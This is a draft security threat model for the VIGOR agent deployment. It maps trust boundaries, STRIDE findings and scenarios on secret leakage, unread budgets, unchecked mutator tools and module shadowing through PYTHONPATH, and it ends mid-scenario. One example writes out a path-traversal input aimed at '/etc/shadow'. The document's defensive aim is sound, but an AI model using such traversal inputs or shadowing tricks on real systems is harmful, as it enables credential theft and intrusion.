<!-- written-by: builder-deployment-threat-model (VIGOR-f44c, parent VIGOR-c1ab) -->
# VIGOR Threat Model — In-Production Deployment

**Status:** Draft
**Date:** 2026-05-15
**Scope:** VIGOR-in-production deployment, including `vigor-agent` + `vigor-runtime` + `vigor-mcp` + the Claude Agent SDK backend (`vigor-backend-claude-agent-sdk`). Evaluates whether the code-as-of-`main` enforces the security policies committed to in `SECURITY.md`, ADR-0014, ADR-0016, and ADR-0017.
**Authors:** builder-deployment-threat-model (overstory swarm, parent: lead-deployment-strategy-v2 / VIGOR-c1ab)
**Methodology:** STRIDE per Microsoft / OWASP, scaled to PR-level. Driven by the named gaps in `.overstory/specs/VIGOR-4293.md` (deployment scout report).

---

## 0. How To Read This Document

Three labels qualify every finding so the gap between paper policy and shipping code stays visible:

| Label | Meaning |
|---|---|
| **policy-only** | The control is committed to in an ADR or `SECURITY.md`, but no code path enforces it. |
| **partially-enforced** | Some call sites enforce the control, others do not; or the control is asserted at one boundary but not at another it depends on. |
| **unimplemented** | The control is not in any spec and not in code. Greenfield. |
| **enforced** | A code anchor demonstrates the control rejecting a violation. |

Risk = max(Likelihood, Impact) when both ≥ Medium; else median. Likelihood and Impact ratings are defended in 1–2 sentences inside each scenario.

Code anchors use `path:line` form; line numbers are pinned to the commit that motivates the threat (current `main` at the 2026-05-15 cutoff).

This TM does **not** propose net-new architecture. Forward-looking ADRs are sibling task **VIGOR-a29a**'s deliverable; mitigation seed creation is sibling **VIGOR-a29a**. Where this document references a "P0/P1/P2" classification it is making a *threat-prioritisation* claim, not committing to an implementation order.

---

## 1. System Under Analysis

### 1.1 Deployment topology (per ADR-0016 §"Transport policy")

```
                        ┌────────────────────────────────────────────────────────┐
                        │  Tenant operator (CLI invocation, hosted submission)   │
                        └───────────┬────────────────────────────────────────────┘
                                    │ (1)  TaskSpec + AgentConfig (YAML/JSON)
                                    ▼
┌──────────────────────────────────────────────────────────────────────────────┐
│  vigor-agent.AgentOrchestrator   (CPU, slim runtime image)                   │
│  ┌──────────────────────────────────────────────────────────────────────┐    │
│  │ AdapterRegistry (factory-loaded Python, allowlist-gated)             │    │
│  │ Router (modality_match | domain_match | explicit | single)           │    │
│  │ RunArchive  (filesystem, root-pinned)                                │    │
│  │ ToolBackend (None | MCPToolBackend)                                  │    │
│  └──────────────────────────────────────────────────────────────────────┘    │
└────┬───────────────────────────┬────────────────────────────┬────────────────┘
     │ (2) AgentBackend           │ (3) ToolBackend            │ (7) RunArchive
     │     (per-task, aclose)     │     (long-lived, aclose)   │     (per-run dir)
     ▼                            ▼                            ▼
┌────────────────────┐  ┌──────────────────────────┐   ┌──────────────────────┐
│ Claude Agent SDK   │  │ MCPToolBackend           │   │ Filesystem           │
│ (subprocess pool;  │  │ (one _ServerHandle per   │   │ {archive_dir}/{run}  │
│  permission_mode=  │  │  declared MCPServerSpec) │   │  (no rotation)       │
│  "dontAsk"; env    │  │                          │   └──────────────────────┘
│  passed verbatim)  │  │  ┌── stdio (4) ──┐       │
└────────────────────┘  │  │ subprocess +  │       │
                        │  │ inherited env │       │
                        │  └───────────────┘       │
                        │  ┌── http/sse (5) ┐      │
                        │  │ remote MCP svr │      │
                        │  │ (Auth: Bearer  │      │
                        │  │  / mTLS opt)   │      │
                        │  └────────────────┘      │
                        └──────────────────────────┘
                                  ▲
                                  │ (6) plugin-supplied MCP servers (ADR-0017)
                                  │     [policy-only host gate]
                        ┌─────────┴────────┐
                        │ Plugin directory │
                        │  .plugin/*       │
                        └──────────────────┘
```

Numbers in parentheses correspond to the trust boundaries in §3.

### 1.2 Assumptions

These assumptions condition every threat below. If any is wrong for a given deployment, that deployment must re-evaluate the corresponding rows.

1. **Single-tenant per process today.** Although multi-tenant hosted is the strategic direction (see VIGOR-c1ab), the analysis below treats the *current* code as single-tenant: one tenant's `AgentConfig`, one parent process, one `RunArchive` root.
2. **`os.environ` of the parent process is treated as **secret-bearing**.** Hosted operators inject vendor keys (`ANTHROPIC_API_KEY`, `GEMINI_API_KEY`, `AWS_*`) at process boot; nothing strips these before subprocess fan-out.
3. **`AgentConfig` files are loaded from a tenant-controlled path.** Operators must keep these files private; YAML/JSON loading does not protect them.
4. **MCP servers are the only declared external network egress** other than the agent backend itself. CLAUDE Vision uses the Anthropic API key from agent env; CAD/Video MCP servers are local-stdio per ADR-0016 except the VideoScore2 wrap (http/sse).
5. **Adapters, MCP servers, and plugin authors are partially trusted.** They run inside the same Python process as the orchestrator (adapters, factory-loaded; plugins, factory + manifest-loaded). Compromise of any of them ⇒ compromise of the host process.
6. **No first-class secrets store.** All API keys are environment-variable-only; there is no Vault, KMS, or `SecretStr` adoption (`vigor-core/agent_config.py:53-89` declares `env: dict[str, str]` and `headers: dict[str, str]` as plain dicts).
7. **TLS is honoured by the `mcp` SDK transports.** This TM does not re-derive TLS posture for SSE / streamable-HTTP; it relies on the SDK and on operator-configured `https://` URLs in `MCPServerSpec.url`.

### 1.3 What the orchestrator actually does (one-paragraph summary)

`AgentOrchestrator.run` (`packages/vigor-agent/src/vigor_agent/agent.py:81-91`) resolves an adapter via `Router`, instantiates a fresh `AgentBackend` per task, and delegates to `vigor-runtime.Orchestrator.run` with a long-lived `ToolBackend` (typically `MCPToolBackend`). The runtime loop (`packages/vigor-runtime/src/vigor_runtime/orchestrator.py:88-250`) cycles for `task.budgets.max_iterations`, generating candidates, compiling, reviewing, adjudicating, and patching. Errors are caught at adapter and backend boundaries and coerced into either `CompileResult.status="failure"` or fail-shaped `ReviewReport`s. At iteration boundary the wall-clock budget is checked (`orchestrator.py:116-118`); cost and retry budgets are not.

---

## 2. Asset List

CIA columns rated H/M/L. Rationale tightly tied to VIGOR's specific deployment exposure, not generic.

| Asset | Confidentiality | Integrity | Availability | Why it matters |
|---|---|---|---|---|
| **Vendor API keys** (Anthropic, Gemini/Vertex, GLM/Doubao/Hunyuan via `luma-mcp`, VideoScore2 wrap) | **H** | **H** | M | Keys are billable and authority-conferring on the vendor side; leak ⇒ unauthorised model usage on tenant's account, vendor terms violation. ADR-0016 §"Vendor auth" mandates monthly rotation but does not enforce it. |
| **MCP server credentials** (`MCPServerSpec.headers`, `MCPServerSpec.env`) | **H** | M | M | Same shape as vendor keys but per-server. Includes `Authorization: Bearer …` for VideoScore2 wrap and any future hosted MCP. |
| **Run archive contents** (`{archive_dir}/{run_id}/**`) | M | **H** | M | Holds tasks, IRs, compile results, reviews, adjudications, patches, exports, errors, frontiers, provenance. Tampering corrupts adjudication reproducibility (ADR-0011 IR contract). Includes free-text reviewer outputs that may carry PII. |
| **IR contents** (`ArtifactIR.body`) | M | **H** | M | Domain-specific payload; for CAD adapters this includes geometry, for photo adapters it includes prompts. Tampering ⇒ corrupted artifact downstream of accepted run. |
| **Generated patches** (`PatchPlan.objectives`) | L | **H** | M | Drive the next iteration; tampering ⇒ steered convergence. Authored by the agent backend, not user-supplied. |
| **Audit / provenance records** (`ProvenanceRecord`, future audit-event schema) | M | **H** | M | The only record that activities happened. Today: `ProvenanceRecord` only — no MCP-call entries, no tenant id, no hash chain (`schemas.py:287-298`). Integrity matters because this is the only post-hoc evidence trail. |
| **Run provenance for compliance** (signed artifact bundle hashes) | M | **H** | L | `ExportBundle` carries `sha256` per export (`schemas.py:243-247`); but the surrounding bundle is not signed. Integrity is local-only. |
| **Factory namespaces** (the set of importable Python modules `FactoryRef.allowed_prefixes` may resolve to) | M | **H** | M | Compromise = arbitrary code execution in the host process. Two-layered allowlist (`agent_config.py:175-200`) is the only gate. |
| **Allowlists themselves** (`MCPServerSpec.tool_allowlist`, `AgentConfig.allowed_plugin_factory_prefixes`) | L | **H** | L | If the allowlist is mutable post-load (it is not, today — pydantic frozen-ish models), the security guarantee evaporates. Integrity is the load-bearing property. |
| **Tenant identity** | **H** | **H** | M | Currently **not modelled** anywhere in the schemas. There is no `tenant_id` on `RunContext`, `TaskSpec`, `ProvenanceRecord`, or `MCPServerSpec`. Multi-tenant hosting is therefore an operator-supplied invariant, not a code-enforced one. |
| **Subprocess env (parent `os.environ`)** | **H** | M | L | Stdio MCP transport inherits parent env when `spec.env` is unset (`transports/sdk.py:43`). Confidentiality is the dominant property — leak vector. |

---

## 3. Trust Boundaries

Numbered to match the topology diagram in §1.1.

1. **Tenant ↔ `vigor-agent`** — operator submits `TaskSpec` and `AgentConfig`. Untrusted across this boundary: the YAML/JSON parser must reject malformed configs (Pydantic strict mode at `vigor-core/schemas.py:21-31` does this); references to remote URIs (`ReferenceArtifact.uri`) are *not* fetched by the runtime and so do not introduce a fetch-time trust crossing here.
2. **`vigor-agent` ↔ `AgentBackend`** — the backend is instantiated per task via `call_factory` (`agent.py:83-94`). For Claude SDK, the SDK launches a subprocess pool. Trust crossing: backend writes responses into `ArtifactIR.body`, `ReviewReport.summary`, `PatchPlan.objectives` — these are then consumed by adapter code that may execute them.
3. **`vigor-runtime` ↔ `ToolBackend`** — the runtime calls `ToolBackend.call_tool(...)` via the optional `RunContext.tools` (`orchestrator.py:104-109`). Trust crossing: tool responses become `ToolResult.output` dicts that adapter code may execute (e.g. CAD `run_fem_analysis` returning a path that the adapter passes to a renderer).
4. **`MCPToolBackend` ↔ stdio MCP subprocess** — `transports/sdk.py:35-45` spawns the subprocess with optional `spec.env`. The subprocess is fully partially-trusted (third-party code per ADR-0016). Trust crossing: subprocess output is JSON parsed via the MCP SDK; payloads can contain text/binary content (`backend.py:174-192`).
5. **`MCPToolBackend` ↔ http/sse MCP server** — `transports/sdk.py:46-74` opens an SSE or streamable-HTTP session. Trust crossing: server identity is whatever DNS+TLS resolves; auth is per-server (Bearer / mTLS, ADR-0016 §"Vendor auth"). Server returns the same MCP response shape as stdio.
6. **Plugin ↔ host** — ADR-0014's `assert_factory_ref_allowed` (`agent_config.py:175-200`) gates plugin-declared `FactoryRef.allowed_prefixes`. ADR-0017 adds pure-MCP plugins as ambient tool sources, but the host-side `plugin_allowed_mcp_servers` allowlist is **not yet implemented** (per ADR-0017 "Follow-ups required …"). This boundary is the most paper-policy-heavy in the system.
7. **`RunArchive` ↔ filesystem** — `RunArchive._safe_target` (`archive.py:170-180`) rejects absolute paths and any `relative_path` whose resolved location escapes `self.root`. This is enforced today.

---

## 4. STRIDE-Per-Component Matrix

The matrix tabulates *one* dominant threat per (component, STRIDE-letter) cell, with code anchor and an enforcement label. Detailed scenarios with risk ratings and mitigations are in §5; the matrix is the coverage chart.

Components in scope: **AgentOrchestrator** (vigor-agent), **Orchestrator** (vigor-runtime), **MCPToolBackend.stdio**, **MCPToolBackend.http/sse**, **RunArchive**, **AgentConfig loader**, **FactoryRef loader**, **Claude Agent SDK backend**.

### 4.1 AgentOrchestrator (`packages/vigor-agent/src/vigor_agent/agent.py`)

| STRIDE | Threat | Anchor | Enforcement |
|---|---|---|---|
| **S** Spoofing | No tenant identity — any caller of `AgentOrchestrator.run` is anonymously authoritative | `agent.py:81-91` | unimplemented |
| **T** Tampering | `_build_backend` returns whatever the factory yields — backend can substitute arbitrary IR | `agent.py:93-100` | partially-enforced (factory allowlist gates *which* factory; not what it does) |
| **R** Repudiation | No audit event when AgentOrchestrator picks an adapter or constructs a backend | `agent.py:81-91` | unimplemented |
| **I** Information disclosure | `MCPServerSpec.env` / `headers` (containing secrets) survives `AgentConfig.model_dump_json` | `agent_config.py:53-69` | unimplemented (no `SecretStr`) |
| **D** Denial of service | `_build_tool_backend` fails closed only on missing `vigor-mcp`; degraded MCPs aren't health-checked at construction | `agent.py:51-62` | partially-enforced |
| **E** Elevation of privilege | Backend factory imported by `call_factory` runs at constructor time — load-time RCE if allowlist is empty | `agent.py:46-49`, `agent_config.py:175-194` | enforced (host-side allowlist + `assert_factory_ref_allowed`) |

### 4.2 Orchestrator (`packages/vigor-runtime/src/vigor_runtime/orchestrator.py`)

| STRIDE | Threat | Anchor | Enforcement |
|---|---|---|---|
| **S** | Generic `Exception` handler at run-loop top obscures whether failure originated in trusted (adapter) or partially-trusted (backend) code path | `orchestrator.py:202-211` | partially-enforced (`_ERROR_KINDS` distinguishes types but only for VigorError) |
| **T** | `apply_patch` produces invalid IR ⇒ aborts; but `validate_ir` runs on `patched_ir` only, not on backend-supplied generations | `orchestrator.py:169-184` vs `orchestrator.py:283-303` | partially-enforced (validate is run at evaluate time, not at generate time) |
| **R** | `ProvenanceRecord` records adapter+backend+adjudication activity types but **not** tool calls | `schemas.py:280` | unimplemented |
| **I** | `RuntimeErrorRecord.message` carries `f"{type(exc).__name__}: {exc}"` — string repr of unknown exceptions can leak file paths, env-shaped tokens | `orchestrator.py:202-211` | unimplemented |
| **D** | `max_wall_clock_s` enforced; `max_cost_usd`, `max_tool_retries`, `max_candidates` partial — no per-iteration token-cost gate | `orchestrator.py:114-118`, `schemas.py:51-58` | partially-enforced |
| **E** | `_safe_compile` catches `VigorError` but a non-`VigorError` raised by adapter `compile` propagates to top-level `Exception` handler — same shape as `Exception` from any non-adapter code path | `orchestrator.py:391-411` | partially-enforced |

### 4.3 MCPToolBackend stdio path (`packages/vigor-mcp/src/vigor_mcp/{backend.py,transports/sdk.py}`)

| STRIDE | Threat | Anchor | Enforcement |
|---|---|---|---|
| **S** | Stdio subprocess identity is "whatever resolves on PATH" — `command[0]` is not checked against a fingerprint or signature | `transports/sdk.py:36-44` | unimplemented (MCP server signing is a 2025 proposal, not standardised — ADR-0016) |
| **T** | Subprocess can return `isError=False` payloads containing arbitrary content; the wrap simply attaches `output["content"]` and `output["structured"]` | `backend.py:174-192` | unimplemented (no response-schema validation at the `MCPToolBackend` boundary; per-adapter shims are responsible per ADR-0016 §"Definition of official support" §3) |
| **R** | No audit log of `call_tool` invocations | `backend.py:122-157` | unimplemented |
| **I** | If `spec.env` is unset, parent `os.environ` is inherited verbatim by subprocess (`StdioServerParameters(env=None)` semantics) | `transports/sdk.py:43` | partially-enforced (operator can set `env={}` to drop all; default is "leak") |
| **D** | `asyncio.wait_for(timeout=spec.timeout_s)` enforced; default 30 s; teardown via `handle.aclose()` after timeout | `backend.py:144-149` | enforced |
| **E** | Mutator capability is a schema field (`ToolManifest.mutability`) but `call_tool` does not check it before invoking — any allowlisted tool can be called regardless of mutator status | `backend.py:122-157`, `schemas.py:80` | policy-only |

### 4.4 MCPToolBackend http/sse path (`packages/vigor-mcp/src/vigor_mcp/transports/sdk.py:46-74`)

| STRIDE | Threat | Anchor | Enforcement |
|---|---|---|---|
| **S** | Server identity = DNS + TLS. No certificate pinning, no client auth beyond optional Bearer in `headers`. mTLS support is the SDK's responsibility, not VIGOR's. | `transports/sdk.py:46-74` | partially-enforced (delegated to MCP SDK + operator) |
| **T** | TLS protects in transit; once decoded, threat is identical to stdio (server can return any content) | `backend.py:174-192` | unimplemented (response-shape validation per-adapter, not enforced at backend) |
| **R** | No audit log of `call_tool`; no SSE event id ⇒ ProvenanceRecord linkage | `backend.py:122-157` | unimplemented |
| **I** | `MCPServerSpec.headers` (Bearer tokens) appears in plain dict; surfaced to logs if `MCPToolBackend.__repr__` is ever called or `AgentConfig` is `model_dump_json`'d | `agent_config.py:65-66` | unimplemented |
| **D** | Per-server `timeout_s` enforced. No rate limit, no circuit breaker, no per-server failure tracking | `backend.py:144-147` | partially-enforced |
| **E** | Same mutator-capability gap as stdio | `backend.py:122-157`, `schemas.py:80` | policy-only |

### 4.5 RunArchive (`packages/vigor-core/src/vigor_core/archive.py`)

| STRIDE | Threat | Anchor | Enforcement |
|---|---|---|---|
| **S** | No actor recorded on writes (every record is "the orchestrator wrote it"); per `SECURITY.md` §"Hardening Expectations" the integrity boundary is path containment, not authorial proof | `archive.py:43-180` | unimplemented |
| **T** | Files on disk are mutable by anyone with FS write access — the run dir is not append-only or signed | `archive.py:151-168` | unimplemented |
| **R** | No write log beyond what files appear under `{archive_dir}/{run_id}/` | `archive.py` (entire) | unimplemented |
| **I** | Reviewer outputs (`ReviewReport.summary`) and free-text fields are persisted verbatim — PII / secret-shaped content from the model survives to disk | `archive.py:95-102` | unimplemented |
| **D** | Disk-full ⇒ `pathlib.Path.write_text` raises `OSError` ⇒ generic `Exception` handler in run loop ⇒ run fails. No quota enforcement | `orchestrator.py:202-211` | partially-enforced (graceful failure but no quota) |
| **E** | Path containment via `_safe_target` rejects absolute paths and traversal | `archive.py:170-180` | enforced |

### 4.6 AgentConfig loader (`packages/vigor-agent/src/vigor_agent/config_loader.py`, schema in `vigor-core/agent_config.py`)

| STRIDE | Threat | Anchor | Enforcement |
|---|---|---|---|
| **S** | YAML loader semantics — if `yaml.safe_load` is used (it is, per repo convention) tag injection is blocked. `model_validate` enforces strict-extra | `schemas.py:21-31` | enforced |
| **T** | `AgentConfig` is mutable in-memory (Pydantic `frozen=False` at base class) — runtime can rewrite the allowlist at any point | `schemas.py:30-31` | partially-enforced (frozen=False is a deliberate pydantic decision; nothing currently rewrites it) |
| **R** | Config-load events are not logged; a swapped config file at next run is undetectable | `agent_config.py` (entire) | unimplemented |
| **I** | `AgentConfig.model_dump_json` emits `MCPServerSpec.env`, `MCPServerSpec.headers`, `ClaudeBackendConfig.env` verbatim | `agent_config.py:53-69`, `vigor_backend_claude_agent_sdk/backend.py:51-53` | unimplemented |
| **D** | Misconfigured `routing.strategy="single"` ⇒ raises `ValueError` at construction; loud failure at startup, not a runtime DoS | `agent_config.py:165-171` | enforced |
| **E** | `allowed_plugin_factory_prefixes=[]` (default) refuses plugin factories — a permissive config opens RCE-equivalent surface | `agent_config.py:175-200` | partially-enforced (host opt-in; the trichotomy *between* host and plugin allowlist is the enforcement, but a careless host config defeats it) |

### 4.7 FactoryRef loader (`packages/vigor-agent/src/vigor_agent/factory.py`, gate in `agent_config.py:175-200`)

| STRIDE | Threat | Anchor | Enforcement |
|---|---|---|---|
| **S** | Factory module identity = whatever the Python import system resolves. PYTHONPATH manipulation pre-startup is not detected | `factory.py` (call sites in `registry.py`, `agent.py:46-49`) | partially-enforced (allowlist gates module *name*; PYTHONPATH-shadowing of an allowlisted prefix bypasses it) |
| **T** | Factory `kwargs` are passed by `call_factory` — kwargs come from the (trusted) `FactoryRef.kwargs` field, but the factory is responsible for validation | `agent_config.py:38-40` | partially-enforced |
| **R** | No audit event "factory X loaded under prefix Y" | n/a | unimplemented |
| **I** | Factory module's import-time side effects can read `os.environ` and exfiltrate via DNS / file write | implicit | unimplemented |
| **D** | Factory raising at import time ⇒ `FactoryLoadError` at agent construction; loud failure | `agent.py:46-49` | enforced |
| **E** | `assert_factory_ref_allowed` uses dotted-component matching (`mx-c4ce9a` foundational) — typosquats like `vigor_runtime_evil` are rejected | `agent_config.py:196-200` | enforced |

### 4.8 Claude Agent SDK backend (`packages/vigor-backend-claude-agent-sdk/src/vigor_backend_claude_agent_sdk/backend.py`)

| STRIDE | Threat | Anchor | Enforcement |
|---|---|---|---|
| **S** | The SDK launches a subprocess pool with `permission_mode="dontAsk"` and `setting_sources=[]`. Subprocess identity = `claude` binary in PATH | `backend.py:42-43, 75-78` | partially-enforced (subprocess identity not pinned; permission-mode is hermetic) |
| **T** | Backend response (`ResultMessage.result`) is stuffed into `ArtifactIR.body["raw_output"]` verbatim; downstream adapter logic may execute it | `backend.py:104-114` | unimplemented (per-adapter responsibility per `SECURITY.md` §"Hardening Expectations") |
| **R** | `ResultMessage` token counts (cost telemetry) are dropped on the floor — no provenance event for "agent backend completed" | `backend.py:92-95` | unimplemented |
| **I** | `ClaudeBackendConfig.env` ⇒ `ClaudeAgentOptions.env` ⇒ subprocess receives the dict verbatim. If `env={}` is unset, default is `None` ⇒ subprocess inherits parent env | `backend.py:80` | partially-enforced (operator can scope `env={"ANTHROPIC_API_KEY": "..."}`; default is leak) |
| **D** | `max_turns=8` is a soft cap; `permission_mode="dontAsk"` means the SDK won't pause for a permission prompt that could block | `backend.py:42, 75` | enforced |
| **E** | `allowed_tools=["Read", "Glob", "Grep"]` (default) restricts the subprocess to read-only filesystem ops within its CWD | `backend.py:44, 76` | enforced |

---

## 5. Detailed Threat Scenarios

The scenarios below cover every named gap from `.overstory/specs/VIGOR-4293.md` plus a small number of cross-cutting threats the matrix surfaces. Each is numbered (T1, T2, …) so the prioritised-mitigations table in §6 can refer back. Risk = max(L,I) when both ≥ Medium; else median.

### T1 — Subprocess env leak via stdio MCP (parent `os.environ` exfiltration)

- **Component:** MCPToolBackend stdio path
- **Code anchor:** `packages/vigor-mcp/src/vigor_mcp/transports/sdk.py:43` — `env=dict(spec.env) if spec.env else None`. `None` is the documented `StdioServerParameters` semantics for "inherit parent env".
- **Actor:** Author of an officially-supported third-party MCP server (e.g. `tan-yong-sheng/ai-vision-mcp`) who has *not* been compromised — but whose process inherits secrets it does not need.
- **Vector:**
  1. Operator declares `MCPServerSpec(server_id="vision", transport="stdio", command=["uvx", "ai-vision-mcp"])` without setting `env`.
  2. `_check_transport_fields` (`agent_config.py:71-89`) accepts it because `env={}` (the default) is a valid empty dict; the validator only rejects `env` on http/sse, not absence on stdio.
  3. `transports/sdk.py:43` evaluates `spec.env` to a falsy empty dict in the dataclass-default sense (`Field(default_factory=dict)` ⇒ truthy-empty `{}`); the conditional `if spec.env` is False because `{}` is falsy in Python. So `env=None` is passed.
  4. `StdioServerParameters(env=None)` ⇒ subprocess inherits the entire parent `os.environ` including `ANTHROPIC_API_KEY`, `AWS_*`, `GEMINI_API_KEY`, `OPENAI_API_KEY`, anything an operator has loaded.
  5. The subprocess's stdout / stderr / stdin / structured-content responses can ferry env values back across the trust boundary to the orchestrator (or to a vendor egress).
- **Impact:** **High** — a compromised or careless MCP server gets every secret in the host process, not just the one it needs. In hosted multi-tenant, every tenant's secrets leak into every MCP subprocess.
- **Likelihood:** **Medium-High** — the failure is *the default*. Any operator who copies the example specs from ADR-0016 verbatim hits it. Code review catches it only if the reviewer knows that `if {}: ...` is false.
- **Risk:** **High**. Defended: the *default behaviour* is leak; the only mitigation is operator vigilance, which has no enforcement signal. The empirical Pythonic-falsy-empty-dict footgun makes the wrong thing easy.
- **Classification:** policy-only (ADR-0016 §"Vendor auth and rotation" mandates "agent env, never on disk in artifacts" — silent on which env, and how to scope to subprocesses).
- **Mitigation:** **Preventive.** In `transports/sdk.py:35-44`, change the env-construction to `env=dict(spec.env) if spec.env is not None else {"PATH": os.environ.get("PATH", "")}` (default-deny, mirroring `vigor-adapter-video-manim/renderer.py:106` which already does this for the Manim subprocess — the cleanest precedent in the repo). Document the breaking change in ADR-0016 amendment. Sibling task: **VIGOR-a29a-MIT-T1**.

### T2 — Paper budgets: `max_cost_usd` and `max_tool_retries` are unread

- **Component:** Orchestrator (vigor-runtime), schema (`vigor-core`)
- **Code anchor:** `packages/vigor-core/src/vigor_core/schemas.py:57-58` — both fields declared on `Budgets`. Searched-for usage in the runtime returns zero hits except the schema itself.
- **Actor:** Tenant operator who configures `Budgets(max_cost_usd=5.0, max_tool_retries=2)` expecting a hard cost cap.
- **Vector:**
  1. Operator submits a `TaskSpec` with a generous `max_iterations=20` and `max_cost_usd=5.0`.
  2. Orchestrator iteration loop (`orchestrator.py:114-118`) checks only `max_wall_clock_s`. There is no `tokens_used`, `usd_spent`, or `tool_calls` counter on `RunResult` or `RunContext`.
  3. The Claude SDK backend drops `ResultMessage` token counts on the floor (`backend.py:92-95`); `usd` is therefore unobservable to the orchestrator.
  4. Run consumes 50× the intended dollar cap before `max_iterations` or `max_wall_clock_s` halts it.
- **Impact:** **High** — direct financial loss; ADR-0016 vendor keys are tenant-billable. For a hosted product this is a runaway-cost incident.
- **Likelihood:** **High** — anyone who reads the schema and trusts the field name will hit it.
- **Risk:** **High**. Defended: the schema declares a contract the runtime does not honour; that drift is the threat, not a difficult-to-trigger bug.
- **Classification:** unimplemented (cost telemetry doesn't exist; the schema slot is purely declarative).
- **Mitigation:** **Preventive.** Add `AgentBackend.usage()` returning `Usage(input_tokens, output_tokens, usd)`; thread it through a `RunBudgetTracker` checked at iteration boundary; introduce `StopReason="cost_exceeded"`. Sibling: **VIGOR-a29a-MIT-T2**.

### T3 — Dead `retryable` metadata steers reviewer recommendations without backing retry behaviour

- **Component:** Orchestrator
- **Code anchor:** `packages/vigor-runtime/src/vigor_runtime/orchestrator.py:545` — `action = "patch" if exc.retryable else "fail"`. This is the *sole* consumer in the runtime; no retry loop exists.
- **Actor:** Adapter author who throws `VigorError("transient API failure", retryable=True)`.
- **Vector:**
  1. Adapter raises `VigorError(retryable=True)`.
  2. Reviewer error report is shaped with `recommended_action="patch"` (per `_reviewer_error_report`), causing adjudicator to pick the `"patch"` decision branch.
  3. Backend `propose_patch` then synthesises a patch — *for the failure mode itself*. The patch has no causal relation to retry; it is a hallucinated change to a candidate that failed for transient reasons.
  4. Result: convergence noise in the iterative loop; adversarial adapter authors can steer iteration count without producing legitimate patch content.
- **Impact:** **Medium** — wastes iterations and dollars; potentially produces nonsense outputs that the adjudicator accepts; integrity-of-process more than security-of-secret.
- **Likelihood:** **Medium** — any transient failure that the adapter author marks `retryable=True` triggers it.
- **Risk:** **Medium**. Defended: the metadata is misleading by design; the field name promises retry, the implementation gives patch.
- **Classification:** partially-enforced (the field is read; what the field *means* is wrong).
- **Mitigation:** **Preventive.** Either (a) wire `Budgets.max_tool_retries` into a real retry loop in `MCPToolBackend.call_tool` (most consequential — MCP timeouts dominate) and decouple `recommended_action` from `retryable`, or (b) remove `RuntimeErrorRecord.retryable` and `VigorError.retryable` outright. Drift between schema promise and runtime behaviour is the threat. Sibling: **VIGOR-a29a-MIT-T3**.

### T4 — `ToolManifest.mutability` is policy-only — every allowlisted tool can mutate

- **Component:** MCPToolBackend (both transport paths)
- **Code anchor:** `packages/vigor-core/src/vigor_core/schemas.py:80` (`mutability: Literal["observer", "mutator"]`); `packages/vigor-mcp/src/vigor_mcp/backend.py:122-157` (no `mutability` reference in `call_tool`).
- **Actor:** Adapter author who imports an MCP server's full upstream tool list, allowlists everything that "looks read-only", and inadvertently includes an upstream `mutator` tool. (See ADR-0016 §"Negative consequences" item 4 — `neka-nat/freecad-mcp` `execute_code` rename is the canonical worry.)
- **Vector:**
  1. Operator declares `tool_allowlist=["render_single", "validate_scad", "edit_model"]` (oblivious that `edit_model` is mutator).
  2. `_ServerHandle._allowlist` materialises to a frozenset (`backend.py:48-50`); `O(1)` membership check passes.
  3. `call_tool` (`backend.py:131-136`) checks the allowlist but does not check `ToolManifest.mutability`.
  4. The mutator tool runs against the local OpenSCAD installation; a corrupted model overwrites the source.
- **Impact:** **High** — destructive on the local FS; for `freecad-mcp.execute_code` it is shell-equivalent (per ADR-0016 §"Officially supported servers" footnote), elevation-of-privilege at the host process level.
- **Likelihood:** **Medium** — relies on operator allowlist mistake, but ADR-0016 §"Negative consequences" item 4 explicitly flags upstream renames as a silent failure mode for the test-suite enumeration.
- **Risk:** **High**. Defended: `mutability` is on the schema with the explicit purpose of capability gating (per ADR-0016 §3.2), and zero code paths consume it.
- **Classification:** policy-only.
- **Mitigation:** **Preventive.** Add `RunContext.tool_capabilities: frozenset[str]`; have `MCPToolBackend.call_tool` reject any tool whose `ToolManifest.mutability == "mutator"` unless the corresponding capability is in the run context. Tests must enumerate the *full upstream* tool list (per ADR-0016 §"Negative consequences" #4) and assert the allowlist-complement is observer-only. Sibling: **VIGOR-a29a-MIT-T4**.

### T5 — Factory-allowlist defeat via PYTHONPATH or sys.path manipulation

- **Component:** FactoryRef loader (`agent_config.py:175-200`, `factory.py`)
- **Code anchor:** `packages/vigor-core/src/vigor_core/agent_config.py:196-200` — `assert_factory_ref_allowed` does dotted-component matching on the *string name* of the factory's module; it does not check the resolved module's `__file__`.
- **Actor:** Adversary with write access to a directory that ends up earlier on `sys.path` than the legitimate package directories. Common in CI runners with `PWD` on PYTHONPATH, in user installs that prepend `~/.local/lib`, in container images that mount `/opt/agent_extensions` ahead of site-packages.
- **Vector:**
  1. Host config: `allowed_plugin_factory_prefixes=["vigor_adapter_photo"]`.
  2. Plugin declares `FactoryRef(factory="vigor_adapter_photo.evil:Adapter", allowed_prefixes=["vigor_adapter_photo"])`.
  3. `assert_factory_ref_allowed` accepts the prefix. `call_factory` does `importlib.import_module("vigor_adapter_photo.evil")`.
  4. If `~/.local/lib/python3.11/site-packages/vigor_adapter_photo/evil.py` exists (placed there pre-startup), Python imports the *attacker-controlled* module under the trusted name.
  5. Module's import-time side effects exfiltrate `os.environ` to a vendor egress.
- **Impact:** **Critical** — full RCE inside the host process; compromise of all secrets, all archive contents, all in-flight runs.
- **Likelihood:** **Low** — requires pre-existing write access to a PATH dir, which is itself an admin-equivalent compromise. But in shared-CI scenarios, the prerequisite is one carelessly-mounted volume.
- **Risk:** **Medium-High**. Defended: the existing allowlist is a *string* gate, not a *file-path* gate; the dotted-component matching addresses typosquatting (mulch `mx-c4ce9a`) but does not address shadowing.
- **Classification:** partially-enforced.
- **Mitigation:** **Detective + Preventive.** (1) After import, compare the loaded module's `__file__` against an expected path-prefix on disk (e.g. site-packages vs. PYTHONPATH addition). (2) Document the threat in `SECURITY.md` so deployers know to keep `sys.path` clean. (3) Long-term: signed-module verification, but this is well outside the per-repo posture today. Sibling: **VIGOR-a29a-MIT-T5**.

### T6 — MCP path-sandbox gap at the `MCPToolBackend` boundary

- **Component:** MCPToolBackend (both paths)
- **Code anchor:** `packages/vigor-mcp/src/vigor_mcp/backend.py:122-157` — `payload: dict[str, Any]` is passed verbatim. ADR-0016 §5 ("Path sandboxing") mandates archive-root containment "at the `ToolBackend` boundary" but no code in `MCPToolBackend` parses `payload` for path-shaped fields.
- **Actor:** Backend (Claude SDK) hallucinating a path like `"/etc/shadow"` into a tool call payload, OR a buggy adapter that forwards an unsanitised `ReferenceArtifact.uri` value into `payload`.
- **Vector:**
  1. Adapter dispatches `tools.call_tool("mcp.openscad.render_single", {"input_file": "../../../etc/shadow"})`.
